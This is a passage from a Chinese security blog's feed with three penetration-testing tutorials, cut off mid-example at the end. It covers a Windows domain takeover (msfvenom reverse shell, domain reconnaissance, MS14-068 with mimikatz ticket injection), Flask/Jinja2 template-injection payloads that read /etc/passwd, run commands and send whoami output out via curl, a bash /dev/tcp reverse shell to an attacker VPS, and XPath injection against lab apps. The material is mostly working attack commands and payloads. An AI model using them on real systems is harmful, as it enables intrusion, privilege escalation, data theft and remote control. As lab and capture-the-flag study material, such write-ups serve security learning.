Controller在内的域内中任何一台电脑</p><p>首先得拿到一个shell</p><ul><li>上传Metasploit的反弹马，shell下执行命令</li></ul><p>生成反弹马（这里我win7没有管理员权限，启动不了web服务，遂用exe的）</p><p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.211.201 LPORT=7777 -f exe &gt; ./Desktop/re.exe</code></p><p><img src="https://i.loli.net/2018/08/11/5b6ebd928dda7.png" alt="s10.png"></p><p>msfconsole设置监听并启动</p><p><img src="https://i.loli.net/2018/08/11/5b6ebde419856.png" alt="s11.png"></p><p>输入shell进入控制台，因为win7是中文控制台，会有乱码</p><h5 id="常用信息收集命令："><a href="#常用信息收集命令：" class="headerlink" title="常用信息收集命令："></a>常用信息收集命令：</h5><p><code>echo %PROCESSOR_ARCHITECTURE%</code> //查看系统版本位数</p><p><code>netstat -ano</code> //查看开放的端口</p><p><code>net config Workstation</code> //当前计算机名，全名，用户名，系统版本，工作站域，登陆域</p><p><code>net user /domain b404 pass</code> //修改域内用户密码，需要管理员权限</p><p><code>tasklist /S IP地址 /U 域名\用户名 /P /V</code>    //查看远程计算机进程</p><p><code>tasklist /svc</code>    //查看进程</p><p><code>taskkill /im 进程名称(cmd.exe)</code>    //结束进程</p><p><code>taskkill /pid[进程码]</code>    //<code>-t</code>(结束该进程) <code>-f</code>(强制结束该进程以及所有子进程)</p><p><code>ipconfig /all</code>    //用来查看当前机器的网络环境,判断是工作组,还是域环境.网段是怎么划分的,每个段有多少台机器,DNS服务器IP是多少。</p><p><code>net view</code><br>//用来查看跟本机有关联的机器名.注意,是跟本机有关联的机器,而不是一个段的机器.</p><p><code>net view /domain</code><br>//用来查看当前网络环境存在几个域.</p><p><code>net view /domain:xxxx</code><br>//查看xxx域中存在的跟本机有关联的机器.</p><p><code>net group &quot;domain admins&quot; /domain</code><br>//查看域内管理员.</p><p><code>net user /domain</code><br>//查看域内的用户名.</p><p><code>net group &quot;domain computers&quot; /domain</code><br>//查看域内所有机器名.</p><p><code>net time /domain</code><br>//查看域时间及域服务器的名字</p><p><code>Nslookup -type=SRV _ldap._tcp.</code><br>//查询DNS</p><p><code>netstat</code><br>//查看连接信息.</p><p><code>net group &quot;Domain Controllers&quot; /domain</code><br>//查找域控</p><p><code>nbtstat</code><br>//由IP地址得到机器名</p><p>ping 扫描内网存活主机：</p><p><code>for /l %i in (1,1,255) do @ping 192.168.200.%i -w 1 -n 1 | find /i&quot;ttl&quot;</code></p><p><img src="https://i.loli.net/2018/08/11/5b6ec46303442.png" alt="s13.png"></p><p>查看是否支持PowerShell：<br><code>if defined PSModulePath (echo support powershell) else (echo not support powershell)</code></p><p>比较全的查询命令：<a href="http://b404.xyz/2017/12/30/exploit-domain/" target="_blank" rel="noopener">域渗透的整理</a></p><h4 id="MS14-068漏洞复现"><a href="#MS14-068漏洞复现" class="headerlink" title="MS14-068漏洞复现"></a>MS14-068漏洞复现</h4><p>这个漏洞允许黑客提升任意普通用户权限成为域管理员（Domain Admin）身份。</p><p>貌似主要是Kerberos协议的算法和信息存放以及任意签名的问题，详细原理：<a href="http://www.freebuf.com/vuls/56081.html" target="_blank" rel="noopener">深入解读MS14-068漏洞</a></p><p>Kerberos协议</p><blockquote><p>Kerberos协议是一种基于第三方可信主机的计算机网络协议，它允许两个实体之间在非安全网络环境（可能被窃听、被重放攻击）下以一种安全的方式证明自己的身份。</p></blockquote><p><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068" target="_blank" rel="noopener">工具</a></p><p>域控地址<br><img src="https://i.loli.net/2018/08/11/5b6ed42422191.png" alt="s15.png"></p><p>用户名与SID<br><img src="https://i.loli.net/2018/08/11/5b6ed42423924.png" alt="s16.png"></p><p>获取TGT并清除缓存票据<br><code>MS14-068.exe -u win7@test.com -p Abcdefg123 -s S-1-5-21-2778320292-2955838337-2508653396-1106 -d xc5ca8.test.com</code></p><p><img src="https://i.loli.net/2018/08/11/5b6ed4ba34466.png" alt="s14.png"></p><p>注入TGT<br><code>mimikatz.exe &quot;kerberos::ptc TGT_win7@test.com.ccache&quot; exit</code></p><p><img src="https://i.loli.net/2018/08/11/5b6ed509efe02.png" alt="s17.png"></p><p><a href="mailto:`TGT_win7@test.com.ccache" target="_blank" rel="noopener">`TGT_win7@test.com.ccache</a>`是个文件，会在本地生成，注意此文件的路径（被坑了半天才发现）</p><p>缓存票据发生变化<br><img src="https://i.loli.net/2018/08/11/5b6ed587618a8.png" alt="s18.png"></p><p>访问域控xc5ca8的资源<br><img src="https://i.loli.net/2018/08/11/5b6ed5a34567f.png" alt="s19.png"></p><p>这时可以传马反弹shell</p><p>copy完后添加计划任务，等待反弹</p><p><img src="https://i.loli.net/2018/08/12/5b6fd98c3c519.png" alt="s20.png"></p><p>成功获取域控的system权限</p><p><img src="https://i.loli.net/2018/08/12/5b6fd98c91a09.png" alt="s21.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;内网渗透真是博大精深&lt;/strong&gt;，测试环境准备起来也有点麻烦，遇到很多问题&lt;/p&gt;
    
    </summary>
    
    
      <category term="windows内网渗透" scheme="http://j0k3r.top/tags/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Flask/Jinja2服务端模版注入</title>
    <link href="http://j0k3r.top/2018/08/12/FJssti/"/>
    <id>http://j0k3r.top/2018/08/12/FJssti/</id>
    <published>2018-08-11T16:00:00.000Z</published>
    <updated>2018-09-04T23:37:14.000Z</updated>
    
    <content type="html"><![CDATA[<p>SSTI(服务端模版注入)</p><a id="more"></a><p>app.py:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from flask import *</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;,methods=&#123;&apos;post&apos;,&apos;get&apos;&#125;)</span><br><span class="line">def hello():</span><br><span class="line">    name = request.values.get(&apos;name&apos;)</span><br><span class="line">    template = &quot;%s&quot; % name</span><br><span class="line">    return render_template_string(&quot;hello &quot;+template)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app.run(host=&apos;0.0.0.0&apos;,port=7777,debug=True)</span><br></pre></td></tr></table></figure><p>会输出name参数，存在xss漏洞<code>?name=&lt;script&gt;alert(1)&lt;/script&gt;</code>即弹窗</p><p>模版引擎计算数学表达式</p><p><img src="https://i.loli.net/2018/08/10/5b6d4045a7cb6.png" alt="s14.png"></p><p>该页面存在SSTI</p><p><img src="https://i.loli.net/2018/08/11/5b6eddbc42c8f.png" alt="ss.png"></p><p>(hexo检测这段老是出问题，暂时以图代文)</p><p><br><br>部分参考：<a href="http://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">http://p0sec.net/index.php/archives/120/</a></p><p>绕过引号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; </span><br><span class="line">().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() </span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)</span><br><span class="line">(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()</span><br><span class="line">[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; </span><br><span class="line">().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() </span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; </span><br><span class="line">().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() </span><br><span class="line">&#125;&#125;&amp;cmd=id</span><br></pre></td></tr></table></figure><p>使用<img src="https://i.loli.net/2018/08/19/5b7970ec88b7d.png" alt="f1.png"><br>绕过<img src="https://i.loli.net/2018/09/04/5b8e361a36a1d.png" alt="f2.png">:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&apos;curl http://127.0.0.1:7999/?i=`whoami`&apos;).read()==&apos;p&apos; %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>盲注读文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/test&apos;).read()[0:1]==&apos;p&apos; %&#125;~p0~&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>绕过<code>[]</code>过滤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;%27%27.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(%27/etc/passwd%27).read()&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__.__getitem__(2).__subclasses__().pop(60).__init__.func_globals.values()&#125;&#125;</span><br></pre></td></tr></table></figure><p>过滤双下划线</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=&#123;&#123;(request.values.s1*2,request.values.s2,request.values.s3*2)|join&#125;&#125;&amp;s1=_&amp;s2=import&amp;s3=_</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secret=&#123;&#123;requests|attr((request.args.usc*2,request.args.class,request.args.usc*2)|%09join)&#125;&#125;&amp;class=class&amp;usc=_</span><br></pre></td></tr></table></figure><p>file类是可以列举文件对象，利用file的read方法读取文件</p><p><img src="https://i.loli.net/2018/08/10/5b6d7c90a81e0.png" alt="s15.png"></p><p>利用file写文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;2f7573722f6c6f63616c2f6c69622f707974686f6e322e372f646973742d7061636b616765732f6a696e6a61322f656e7669726f6e6d656e742e7079&apos;.decode(&apos;hex&apos;),&apos;a&apos;).write(&quot;\nos.system(&apos;curl your_ip &gt;1&apos;)&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>结合沙盒逃逸Jiaja2模板任意代码执行payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &apos;catch_warnings&apos; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.func_globals.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &apos;eval&apos; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;cat /etc/passwd&quot;).read()&apos;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>就是获取eval函数并执行任意代码</p><p>其中<code>[].__class__.__base__</code>为object，其<code>__subclasses__()</code>指所有继承object的类</p><p>urlencode:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22cat%20/etc/passwd%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D</span><br></pre></td></tr></table></figure><p>在反弹shell的时候<code>bash -i &gt;&amp; /dev/tcp/vps的ip/7777 0&gt;&amp;1</code>中的<code>&amp;</code>要urlencode为<code>%26</code></p><p><img src="https://i.loli.net/2018/08/10/5b6d891456a04.png" alt="s16.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SSTI(服务端模版注入)&lt;/p&gt;
    
    </summary>
    
    
      <category term="Flask/Jinja2-ssti" scheme="http://j0k3r.top/tags/Flask-Jinja2-ssti/"/>
    
  </entry>
  
  <entry>
    <title>代码注入漏洞</title>
    <link href="http://j0k3r.top/2018/08/09/code-inject/"/>
    <id>http://j0k3r.top/2018/08/09/code-inject/</id>
    <published>2018-08-08T16:00:00.000Z</published>
    <updated>2019-04-22T11:53:32.663Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读</p><a id="more"></a><h3 id="Xpath注入"><a href="#Xpath注入" class="headerlink" title="Xpath注入"></a>Xpath注入</h3><p>当xml被用来储存数据时，类似数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p>xpath则被用来查询xml</p><p>Xpath注入即是恶意的查询代码</p><p>这里用ichunqiu上一个例子</p><p>score.xml:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">class</span> <span class="attr">num</span>=<span class="string">'1'</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">peo</span> <span class="attr">name</span>=<span class="string">'tom'</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">subject</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">foo</span>&gt;</span>english<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">score</span>&gt;</span>60<span class="tag">&lt;/<span class="name">score</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">subject</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">subject</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">foo</span>&gt;</span>chinese<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">score</span>&gt;</span>70<span class="tag">&lt;/<span class="name">score</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">subject</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">password</span>&gt;</span>qwer123<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">peo</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">peo</span> <span class="attr">name</span>=<span class="string">'helen'</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">subject</span>&gt;</span> </span><br><span class="line">                                <span class="tag">&lt;<span class="name">foo</span>&gt;</span>english<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">score</span>&gt;</span>24<span class="tag">&lt;/<span class="name">score</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">subject</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">subject</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">foo</span>&gt;</span>chinese<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">score</span>&gt;</span>34<span class="tag">&lt;/<span class="name">score</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">subject</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">password</span>&gt;</span>woaichishi<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">peo</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">peo</span> <span class="attr">name</span>=<span class="string">'vk'</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">subject</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">foo</span>&gt;</span>english<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">score</span>&gt;</span>100<span class="tag">&lt;/<span class="name">score</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">subject</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">subject</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">foo</span>&gt;</span>chinese<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">score</span>&gt;</span>100<span class="tag">&lt;/<span class="name">score</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">subject</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">password</span>&gt;</span>vk123<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">peo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>score.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (file_exists(<span class="string">'score.xml'</span>))&#123;</span><br><span class="line">        $xml = simplexml_load_file(<span class="string">'score.xml'</span>);  <span class="comment">//获取xml文件里面的数据</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'user'</span>]))&#123;</span><br><span class="line">                $user = $_GET[<span class="string">'user'</span>];</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">                <span class="comment">//构造语句</span></span><br><span class="line">                $en_scr = <span class="string">"//peo[@name='&#123;$user&#125;']/subject[contains(foo, 'english')]/score"</span>;</span><br><span class="line">                $ch_scr = <span class="string">"//peo[@name='&#123;$user&#125;']/subject[contains(foo, 'chinese')]/score"</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">                $en_qu = $xml -&gt; xpath($en_scr);</span><br><span class="line">                $ch_qu = $xml -&gt; xpath($ch_scr);</span><br><span class="line">                <span class="keyword">foreach</span> ($en_qu <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> $user.<span class="string">':&lt;br&gt;english is '</span>.$value;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">foreach</span> ($ch_qu <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>.<span class="string">'chinese is '</span>.$value;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'only have three user: vk, tom, helen.'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>$en_scr = &quot;//peo[@name=&#39;{$user}&#39;]/subject[contains(foo, &#39;english&#39;)]/score&quot;;</code>便是xpath路径选取xml节点的语句</p><p><code>//peo[@name=&#39;{$user}&#39;]</code>选取所有拥有值为user的name属性的peo元素</p><p>contains函数，匹配出他的foo子节点中，信息含有english的部分</p><p>找到相应的subject后，score存放分数</p><p>xpath的注入还有通过updataxml()函数实现xpath报错注入、xpath盲注</p><h3 id="XPath-Injection-Login-Form-bWAPP"><a href="#XPath-Injection-Login-Form-bWAPP" class="headerlink" title="XPath Injection (Login Form) (bWAPP)"></a>XPath Injection (Login Form) (bWAPP)</h3><p>登陆判断部分：</p><p><code>$result = $xml-&gt;xpath(&quot;/heroes/hero[login=&#39;&quot; . $login . &quot;&#39; and password=&#39;&quot; . $password . &quot;&#39;]&quot;);</code></p><p>闭合单引号，构造</p><p><img src="https://i.loli.net/2018/08/09/5b6bb1d848d31.png" alt="s12.png"></p><p>这是语句变成<code>/heroes/hero[login=&#39;q&#39; or &#39;1&#39;=&#39;1&#39; and password=&#39;q&#39; or &#39;1&#39;=&#39;1&#39;]</code>,成功登陆</p><p>或只在Login里输入<code>q&#39; or 1=1 or &#39;1&#39;=&#39;1</code></p><h3 id="XPath-Injection-Search-bwAPP"><a href="#XPath-Injection-Search-bwAPP" class="headerlink" title="XPath Injection (Search) (bwAPP)"></a>XPath Injection (Search) (bwAPP)</h3><p><code>$result = $xml-&gt;xpath(&quot;//hero[contains(genre, &#39;$genre&#39;)]/movie&quot;);</code></p><p>构造<code>&#39;)]/password|a[contains(aa,&#39;</code>获取password</p><p><img src="https://i.loli.net/2018/08/09/5b6bba0197b0a.png" alt="s13.png"></p><h3 id="injection-hctf2015"><a href="#injection-hctf2015" class="headerlink" title="injection(hctf2015)"></a>injection(hctf2015)</h3><p>源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$re = array(&apos;and&apos;,&apos;or&apos;,&apos;count&apos;,&apos;select&apos;,&apos;from&apos;,&apos;union&apos;,&apos;group&apos;,&apos;by&apos;,&apos;limit&apos;,&apos;insert&apos;,&apos;where&apos;,&apos;order&apos;,&apos;alter&apos;,&apos;delete&apos;,&apos;having&apos;,&apos;max&apos;,&apos;min&apos;,&apos;avg&apos;,&apos;sum&apos;,&apos;sqrt&apos;,&apos;rand&apos;,&apos;concat&apos;,&apos;sleep&apos;);</span><br><span class="line">setcookie(&apos;injection&apos;,&apos;c3FsaSBpcyBub3QgdGhlIG9ubHkgd2F5IGZvciBpbmplY3Rpb24=&apos;,time()+100000);</span><br><span class="line">if(file_exists(&apos;t3st.xml&apos;)) &#123;</span><br><span class="line">    $xml = simplexml_load_file(&apos;t3st.xml&apos;);</span><br><span class="line">    $user=$_GET[&apos;user&apos;];</span><br><span class="line">$user=str_replace($re, &apos; &apos;, $user);</span><br><span class="line">  //  $user=str_replace(&quot;&apos;&quot;, &quot;&amp;apos&quot;, $user);</span><br><span class="line">    $query=&quot;user/username[@name=&apos;&quot;.$user.&quot;&apos;]&quot;;</span><br><span class="line">  </span><br><span class="line">    $ans = $xml-&gt;xpath($query);</span><br><span class="line">    foreach($ans as $x =&gt; $x_value)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $x.&quot;:  &quot; . $x_value;</span><br><span class="line">        echo &quot;&lt;br /&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>类似sql注入，闭合单引号和[],<code>//*</code>选取所有元素,<code>|</code>计算返回两个节点集</p><p>payload: <code>?user=q%27]|//*|a[%27</code></p><p><img src="https://i.loli.net/2018/08/09/5b6bac6bb30b4.png" alt="s11.png"></p><p><a href="http://www.runoob.com/xpath/xpath-syntax.html" target="_blank" rel="noopener">XPath 语法</a></p><p><a href="http://www.runoob.com/xpath/xpath-operators.html" target="_blank" rel="noopener">XPath 运算符</a></p><h3 id="Json注入"><a href="#Json注入" class="headerlink" title="Json注入"></a>Json注入</h3><p><strong>Json</strong></p><blockquote><p>JSON: JavaScript Object Notation(JavaScript 对象表示法),是存储和交换文本信息的语法。类似 XML。</p></blockquote><blockquote><p>JSON 具有层级结构（值中存在值）, JSON 是纯文本</p></blockquote><blockquote><p>JSON 可通过 JavaScript 进行解析</p></blockquote><blockquote><p>JSON 数据可使用 AJAX 进行传输</p></blockquote><p>根据json语法修改数据<code>{&quot;adduser&quot;:[{&quot;username&quot;:&quot;admin1&quot;,&quot;password&quot;:&quot;123456&quot;}]}，可以注入多增加一个 password=&gt;123456&quot;},{&quot;username&quot;:&quot;admin2&quot;,&quot;password&quot;:&quot;123456</code></p><p><strong>json劫持</strong></p><p>即某个JSON服务或者接口返回有价值的敏感的JSON数组数据，比如/api/xxx攻击者针对这个网站进行JSON劫持攻击，获取敏感信息</p><h3 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h3><p>有关xml我在<a href="https://zhuxianjin.github.io/2018/06/10/k14-xxe/" target="_blank" rel="noopener">XML External Entity attack/XXE攻击 | J0k3r</a>有文件读取的相关内容</p><p><strong>xxe内网信息探测</strong></p><p>探测端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$xml=&lt;&lt;&lt;EOF</span><br><span class="line">&lt;?xml 